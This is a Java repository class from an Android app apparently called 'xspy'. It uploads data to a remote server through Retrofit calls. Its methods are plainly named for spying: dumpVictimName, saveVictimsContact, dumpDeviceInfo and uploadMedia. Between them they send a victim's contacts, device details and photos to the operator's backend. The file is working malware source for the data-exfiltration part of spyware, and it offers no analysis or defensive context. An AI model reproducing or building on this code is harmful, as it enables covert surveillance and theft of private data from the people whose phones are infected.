package com.redeyesncode.xspy.repo;

import com.google.gson.JsonElement;
import com.redeyesncode.xspy.base.ApiResponseListener;
import com.redeyesncode.xspy.models.DeviceInfoBody;
import com.redeyesncode.xspy.retrofit.ApiInterface;
import com.redeyesncode.xspy.retrofit.RetrofitService;

import java.io.File;
import java.util.HashMap;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainRepository {

    private MainRepository mainRepository;

    private ApiInterface apiInterface;


    public MainRepository(){
        apiInterface = RetrofitService.getRetrofit().create(ApiInterface.class);

    }

    public MainRepository getInstance(){

        if(mainRepository==null){
            mainRepository = new MainRepository();
        }
        return mainRepository;

    }

    public void dumpVictimName(String victimName){
        HashMap<String,String> victimNames = new HashMap<>();
        victimNames.put("userName",victimName);
        Call<JsonElement> call = apiInterface.addVictim(victimNames);
        call.enqueue(new Callback<JsonElement>() {
            @Override
            public void onResponse(Call<JsonElement> call, Response<JsonElement> response) {

            }

            @Override
            public void onFailure(Call<JsonElement> call, Throwable t) {

            }
        });


    }

    public void saveVictimsContact(String victimName,String victimNumber){
        HashMap<String,String> numberModel= new HashMap<>();
        numberModel.put("contactName",victimName);
        numberModel.put("contactNumber",victimNumber);
        Call<JsonElement> call = apiInterface.saveVictimsContact(numberModel);
        call.enqueue(new Callback<JsonElement>() {
            @Override
            public void onResponse(Call<JsonElement> call, Response<JsonElement> response) {

            }

            @Override
            public void onFailure(Call<JsonElement> call, Throwable t) {

            }
        });
    }


    public void dumpDeviceInfo(DeviceInfoBody deviceInfoBody){
        Call<JsonElement> call = apiInterface.dumpDeviceInfo(deviceInfoBody);
        call.enqueue(new Callback<JsonElement>() {
            @Override
            public void onResponse(Call<JsonElement> call, Response<JsonElement> response) {

            }

            @Override
            public void onFailure(Call<JsonElement> call, Throwable t) {

            }
        });

    }

    public void checkServer(ApiResponseListener apiResponseListener){
        Call<JsonElement> call = apiInterface.checkServer();
        call.enqueue(new Callback<JsonElement>() {
            @Override
            public void onResponse(Call<JsonElement> call, Response<JsonElement> response) {
                apiResponseListener.onSuccess(response.body());
            }

            @Override
            public void onFailure(Call<JsonElement> call, Throwable t) {
                apiResponseListener.onError(t.getMessage());


            }
        });

    }
    public void uploadMedia(File image, String victimName){
        RequestBody victimNameRequestBody= RequestBody.create(MediaType.parse("text/plain"),victimName);
        RequestBody imageRequestBody = RequestBody.create(MediaType.parse("image/jpeg"),image);
        MultipartBody.Part imageMultipart = MultipartBody.Part.createFormData("file",image.getName(),imageRequestBody);

        Call<JsonElement> call = apiInterface.uploadMedia(imageMultipart,victimNameRequestBody);
        call.enqueue(new Callback<JsonElement>() {
            @Override
            public void onResponse(Call<JsonElement> call, Response<JsonElement> response) {

            }

            @Override
            public void onFailure(Call<JsonElement> call, Throwable t) {

            }
        });
    }
}
